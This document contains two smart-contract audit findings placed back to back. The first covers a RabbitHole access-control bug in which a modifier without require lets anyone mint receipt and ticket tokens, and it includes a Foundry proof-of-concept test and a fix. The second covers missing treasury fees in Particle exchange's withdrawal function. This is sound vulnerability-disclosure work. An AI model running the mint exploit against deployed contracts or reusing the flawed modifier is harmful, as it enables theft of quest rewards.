Lines of code
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50
Vulnerability details
Both
RabbitHoleReceipt
and
RabbitHoleTickets
contracts define a
mint
function that is protected by a
onlyMinter
modifier:
RabbitHoleReceipt:
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98-L104
----new code block----
function mint(address to_, string memory questId_) public onlyMinter {
    _tokenIds.increment();
 uint newTokenID = _tokenIds.current();
    questIdForTokenId[newTokenID] = questId_;
    timestampForTokenId[newTokenID] = block.timestamp;
    _safeMint(to_, newTokenID);
}
----end of code block ----
RabbitHoleTickets:
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83-L85
----new code block----
function mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {
    _mint(to_, id_, amount_, data_);
}
----end of code block ----
However, in both cases the modifier implementation is flawed as there isn't any check for a require or revert, the comparison will silently return false and let the execution continue:
----new code block----
modifier onlyMinter() {
 msg.sender == minterAddress;
 _;
}
----end of code block ----
Impact
Any account can mint any number of
RabbitHoleReceipt
and
RabbitHoleTickets
tokens.
This represents a critical issue as receipts can be used to claim rewards in quests. An attacker can freely mint receipt tokens for any quest to steal all the rewards from it.
PoC
The following test demonstrates the issue.
----new code block----
contract AuditTest is Test {
 address deployer;
 uint256 signerPrivateKey;
 address signer;
 address royaltyRecipient;
 address minter;
 address protocolFeeRecipient;
​
    QuestFactory factory;
    ReceiptRenderer receiptRenderer;
    RabbitHoleReceipt receipt;
    TicketRenderer ticketRenderer;
    RabbitHoleTickets tickets;
    ERC20 token;
​
 function setUp() public {
        deployer = makeAddr("deployer");
        signerPrivateKey = 0x123;
        signer = vm.addr(signerPrivateKey);
        vm.label(signer, "signer");
        royaltyRecipient = makeAddr("royaltyRecipient");
        minter = makeAddr("minter");
        protocolFeeRecipient = makeAddr("protocolFeeRecipient");
​
        vm.startPrank(deployer);
​
 // Receipt
        receiptRenderer = new ReceiptRenderer();
        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();
        receipt = RabbitHoleReceipt(
 address(new ERC1967Proxy(address(receiptImpl), ""))
        );
        receipt.initialize(
 address(receiptRenderer),
            royaltyRecipient,
            minter,
 0
        );
​
 // factory
        QuestFactory factoryImpl = new QuestFactory();
        factory = QuestFactory(
 address(new ERC1967Proxy(address(factoryImpl), ""))
        );
        factory.initialize(signer, address(receipt), protocolFeeRecipient);
        receipt.setMinterAddress(address(factory));
​
 // tickets
        ticketRenderer = new TicketRenderer();
        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();
        tickets = RabbitHoleTickets(
 address(new ERC1967Proxy(address(ticketsImpl), ""))
        );
        tickets.initialize(
 address(ticketRenderer),
            royaltyRecipient,
            minter,
 0
        );
​
 // ERC20 token
        token = new ERC20("Mock ERC20", "MERC20");
        factory.setRewardAllowlistAddress(address(token), true);
​
        vm.stopPrank();
    }

 function test_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint() public {
 address attacker = makeAddr("attacker");
​
        vm.startPrank(attacker);
​
 // Anyone can freely mint RabbitHoleReceipt
 string memory questId = "a quest";
        receipt.mint(attacker, questId);
        assertEq(receipt.balanceOf(attacker), 1);
​
 // Anyone can freely mint RabbitHoleTickets
 uint256 tokenId = 0;
        tickets.mint(attacker, tokenId, 1, "");
        assertEq(tickets.balanceOf(attacker, tokenId), 1);
​
        vm.stopPrank();
    }
}
----end of code block ----
Recommendation
The modifier should require that the caller is the
minterAddress
in order to revert the call in case this condition doesn't hold.
----new code block----
modifier onlyMinter() {
 require(msg.sender == minterAddress);
 _;
}
----end of code block ----

The Particle exchange collects treasury fees from the lender's interests. These interests are accumulated in the
interestAccrued
mapping and are withdrawn using the
_withdrawAccountInterest()
function, which splits the portion that corresponds to the treasury.
https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L231-L246
----new code block----
231:     function _withdrawAccountInterest(address payable lender) internal {
232:         uint256 interest = interestAccrued[lender];
233:         if (interest == 0) return;
234: 
235:         interestAccrued[lender] = 0;
236: 
237:         if (_treasuryRate > 0) {
238:             uint256 treasuryInterest = MathUtils.calculateTreasuryProportion(interest, _treasuryRate);
239:             _treasury += treasuryInterest;
240:             interest -= treasuryInterest;
241:         }
242: 
243:         lender.transfer(interest);
244: 
245:         emit WithdrawAccountInterest(lender, interest);
246:     }
----end of code block ----
Lines 238-240 calculate treasury fees and accumulate them in the
_treasury
variable, which is later withdrawn by the owner using the
withdrawTreasury()
function.
However, these fees fail to be considered in the case of
withdrawEthWithInterest()
:
https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L192-L223
----new code block----
192:     function withdrawEthWithInterest(Lien calldata lien, uint256 lienId) external override validateLien(lien, lienId) {
193:         if (msg.sender != lien.lender) {
194:             revert Errors.Unauthorized();
195:         }
196: 
197:         if (lien.loanStartTime == 0) {
198:             revert Errors.InactiveLoan();
199:         }
200: 
201:         uint256 payableInterest = _calculateCurrentPayableInterest(lien);
202: 
203:         // verify that the liquidation condition has met (borrower insolvent or auction concluded)
204:         if (payableInterest < lien.credit && !_auctionConcluded(lien.auctionStartTime)) {
205:             revert Errors.LiquidationHasNotReached();
206:         }
207: 
208:         // delete lien (delete first to prevent reentrancy)
209:         delete liens[lienId];
210: 
211:         // transfer ETH with interest back to lender
212:         payable(lien.lender).transfer(lien.price + payableInterest);
213: 
214:         // transfer PnL to borrower
215:         if (lien.credit > payableInterest) {
216:             payable(lien.borrower).transfer(lien.credit - payableInterest);
217:         }
218: 
219:         emit WithdrawETH(lienId);
220: 
221:         // withdraw interest from this account too
222:         _withdrawAccountInterest(payable(msg.sender));
223:     }
----end of code block ----
As we can see in the previous snippet of code, the interests are calculated in line 201, but that amount is then transferred, along with the lien price, back to the lender in full in line 212, without deducting any treasury fees.
Recommendation
The interest can be simply accumulated in the
interestAccrued
mapping, which is later withdrawn (correctly taking into account treasury fees) in the already present call to
_withdrawAccountInterest()
.
----new code block----
 function withdrawEthWithInterest(Lien calldata lien, uint256 lienId) external override validateLien(lien, lienId) {
 if (msg.sender != lien.lender) {
 revert Errors.Unauthorized();
      }
​
 if (lien.loanStartTime == 0) {
 revert Errors.InactiveLoan();
      }
​
 uint256 payableInterest = _calculateCurrentPayableInterest(lien);
​
 // verify that the liquidation condition has met (borrower insolvent or auction concluded)
 if (payableInterest < lien.credit && !_auctionConcluded(lien.auctionStartTime)) {
 revert Errors.LiquidationHasNotReached();
      }
​
 // delete lien (delete first to prevent reentrancy)
 delete liens[lienId];

+ // accrue interest to lender
+     interestAccrued[lien.lender] += payableInterest;
​
@     // transfer ETH back to lender
@     payable(lien.lender).transfer(lien.price);
​
 // transfer PnL to borrower
 if (lien.credit > payableInterest) {
 payable(lien.borrower).transfer(lien.credit - payableInterest);
      }
​
 emit WithdrawETH(lienId);
​
 // withdraw interest from this account too
      _withdrawAccountInterest(payable(msg.sender));
  }
----end of code block ----
